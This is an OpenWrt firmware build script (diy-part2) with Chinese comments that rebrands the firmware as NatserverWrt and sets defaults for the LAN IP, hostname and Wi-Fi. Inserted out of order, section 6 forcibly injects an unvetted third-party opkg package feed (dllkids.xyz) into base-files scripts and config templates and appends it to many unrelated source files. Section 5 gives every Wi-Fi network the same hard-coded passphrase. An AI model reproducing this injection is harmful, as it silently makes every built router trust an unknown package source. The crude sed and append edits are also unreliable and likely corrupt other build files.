#!/bin/bash
# diy-part2: 在 feeds install 之后、copy .config 之前执行
# 工作流调用位置: openwrt/ 目录下
# 主要做: 主机名、IP、版本标识等轻量定制, 不动内核

# 1. 默认 LAN IP 改成 192.168.1.3
sed -i 's/192\.168\.1\.1/192.168.1.3/g' package/base-files/files/bin/config_generate
if ! grep -q '192\.168\.1\.3' package/base-files/files/bin/config_generate; then
  echo "ERROR: LAN 默认 IP 192.168.1.3 未生效" >&2; exit 1
fi

# =====================================================================
# 5. 【智能多频隔离 + 信道自动】双重保险开机 UCI 初始化脚本
# =====================================================================
mkdir -p package/base-files/files/etc/uci-defaults

cat > package/base-files/files/etc/uci-defaults/99-default-wifi << 'EOF'
#!/bin/sh

# 策略 1：首先将所有无线物理硬件（radio）的信道强行设置为自动（auto）
uci -q show wireless | grep "=wifi-device" | cut -d'.' -f2 | cut -d'=' -f1 | while read -r device; do
    uci set wireless.${device}.channel='auto'
done
uci commit wireless

# 策略 2：通过设备代号的物理索引（数字特征）进行无线名称和加密的切分
uci -q show wireless | grep "=wifi-iface" | cut -d'.' -f2 | cut -d'=' -f1 | while read -r iface; do
    device=$(uci -q get wireless.${iface}.device)
    [ -z "$device" ] && continue

    if echo "$device" | grep -qE "1$|2$|5g|wlan1"; then
        uci set wireless.${iface}.ssid='DT-5G'
        uci set wireless.${iface}.encryption='sae'
    else
        uci set wireless.${iface}.ssid='ImmortalWrt'
        uci set wireless.${iface}.encryption='psk2'
    fi
    uci set wireless.${iface}.key='mqy-4708'
done
uci commit wireless

# 策略 3：通过排队顺序终极切割，确保原厂驱动双频百分之百完美剥离
ifaces=$(uci -q show wireless | grep "=wifi-iface" | cut -d'.' -f2 | cut -d'=' -f1)
count=0

for iface in $ifaces; do
    count=$((count + 1))
    if [ "$count" -eq 1 ]; then
        uci set wireless.${iface}.ssid='ImmortalWrt'
        uci set wireless.${iface}.encryption='psk2'
    else
        uci set wireless.${iface}.ssid='DT-5G'
        uci set wireless.${iface}.encryption='sae'
    fi
    uci set wireless.${iface}.key='mqy-4708'
done

uci commit wireless
exit 0
EOF

chmod +x package/base-files/files/etc/uci-defaults/99-default-wifi


# =====================================================================
# 6. 【上游截断注入法】直接把自定义软件源强行固化进入源码树内所有可能生成配置的源头文件
# =====================================================================

TARGET_FEED_URL="src/gz custom_jell_adb https://dllkids.xyz"

# 强行修改 base-files 核心打包脚本（这里是 OpenWrt 生成 /etc/opkg.conf 和 customfeeds.list 的根源）
find package/base-files/ -type f -name "*opkg*" -o -name "*.sh" -o -name "*.init" | while read -r file; do
    if grep -q "customfeeds.list" "$file" 2>/dev/null; then
        # 只要文件里提到了 customfeeds.list，直接在包含它的代码段后，强行插入一行写入指令
        sed -i "s|customfeeds.list|customfeeds.list\n\techo '${TARGET_FEED_URL}' >> \$(1)/etc/opkg/customfeeds.list|g" "$file"
    fi
done

# 保底策略：在最终的默认 rootfs 模板目录下，直接生成 customfeeds.list 并锁死其权限
mkdir -p package/base-files/files/etc/opkg/
echo "${TARGET_FEED_URL}" > package/base-files/files/etc/opkg/customfeeds.list
chmod 644 package/base-files/files/etc/opkg/customfeeds.list

# 全局扫描源码树中所有的 customfeeds.list 字符串，发现一个就拦截并追加一行
find . -type f -name "*.conf" -o -name "*.default" -o -name "*.in" 2>/dev/null | xargs grep -l "customfeeds.list" 2>/dev/null | while read -r mfile; do
    echo "${TARGET_FEED_URL}" >> "$mfile"
done

echo "Successfully locked Wi-Fi channels to auto and forced custom jell adb feed into system configurations."



# 2. 默认主机名 -> NatserverWrt (顶栏侧边品牌等取 hostname)
sed -i "s/hostname='[^']*'/hostname='NatserverWrt'/g" package/base-files/files/bin/config_generate
if ! grep -q "hostname='NatserverWrt'" package/base-files/files/bin/config_generate; then
  echo "ERROR: hostname NatserverWrt 未生效" >&2; exit 1
fi

# 3. 固件名 -> NatserverWrt (CONFIG_VERSION_DIST 符号不存在, 改 version.mk 的兜底值;
#    影响镜像文件名前缀 + DISTRIB_ID + openwrt_release 的 %D 显示)
sed -i 's/\$(VERSION_DIST),OpenWrt)/$(VERSION_DIST),NatserverWrt)/' include/version.mk
if ! grep -q '$(VERSION_DIST),NatserverWrt)' include/version.mk; then
  echo "ERROR: VERSION_DIST NatserverWrt 未生效" >&2; exit 1
fi

# 4. 固件版本描述 (LuCI 概览/登录窗口的 Firmware Version)
if [ -f package/base-files/files/etc/openwrt_release ]; then
  echo "DISTRIB_DESCRIPTION='NatserverWrt snapshot + daed (Tenda BE12 Pro)'" >> package/base-files/files/etc/openwrt_release
fi

# 5. 确保 golang 版本足够新 (dae 需要 go 1.21+), feeds 自带一般够, 这里只打印确认
./scripts/feeds list | grep -E "^(dae|daed|luci-app-daede|vmlinux-btf|v2ray-geo)" || echo "WARN: dae 相关 feed 未列出, 请检查 diy-part1 是否生效"


# 6. 浏览器标签页标题 + 登录窗口大标题 (fanchmwrt 主题硬编码 FanchmWrt, 与 hostname 无关)
sed -i 's|<title>FanchmWrt</title>|<title>NatserverWrt</title>|' package/fcm/luci-theme-fanchmwrt/ucode/template/themes/fanchmwrt/header.ut
if ! grep -q '<title>NatserverWrt</title>' package/fcm/luci-theme-fanchmwrt/ucode/template/themes/fanchmwrt/header.ut; then
  echo "ERROR: 浏览器标签 <title>NatserverWrt</title> 未生效 (header.ut 结构变了?)" >&2; exit 1
fi
sed -i "s/'FanchmWrt'/'NatserverWrt'/" package/fcm/luci-theme-fanchmwrt/htdocs/luci-static/resources/view/fanchmwrt/sysauth.js
if ! grep -q "'NatserverWrt'" package/fcm/luci-theme-fanchmwrt/htdocs/luci-static/resources/view/fanchmwrt/sysauth.js; then
  echo "ERROR: 登录窗口标题 NatserverWrt 未生效 (sysauth.js 结构变了?)" >&2; exit 1
fi
if grep -q "'FanchmWrt'" package/fcm/luci-theme-fanchmwrt/htdocs/luci-static/resources/view/fanchmwrt/sysauth.js; then
  echo "ERROR: sysauth.js 仍残留 'FanchmWrt'" >&2; exit 1
fi
echo "OK: 标签页/登录窗口标题 -> NatserverWrt"

echo "diy-part2 done"
